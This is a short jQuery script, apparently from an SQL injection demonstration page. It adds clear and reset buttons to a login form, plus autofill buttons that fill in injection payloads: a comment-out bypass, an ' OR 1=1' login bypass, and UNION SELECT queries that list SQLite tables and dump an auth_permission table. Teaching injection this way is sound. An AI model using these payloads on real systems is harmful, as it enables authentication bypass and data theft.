$( document ).ready(function() {
    $("#first_name_clear_button").on("click", function() {
        $("#first_name_input").val("");
    });

    $("#password_clear_button").on("click", function() {
        $("#password_input").val("");
    });

    $("#reset_button").on("click", function() {
        $("#first_name_input").val("");
        $("#password_input").val("");
    });

    $("#autofill_button_0").on("click", function() {
        $("#first_name_input").val("Susan");
        $("#password_input").val("8759");
    });

    
    $("#autofill_button_1").on("click", function() {
        $("#first_name_input").val("Susan'; --");
        $("#password_input").val("");
    });

    
    $("#autofill_button_2").on("click", function() {
        $("#first_name_input").val("' OR 1=1; --");
        $("#password_input").val("");
    });

    $("#autofill_button_3_1").on("click", function() {
        $("#first_name_input").val("' UNION SELECT name, NULL, NULL, NULL, NULL, NULL FROM sqlite_master WHERE type='table'; --");
        $("#password_input").val("");
    });
    
    $("#autofill_button_3_2").on("click", function() {
        $("#first_name_input").val("' UNION SELECT *, NULL, NULL FROM auth_permission; --");
        $("#password_input").val("");
    });






});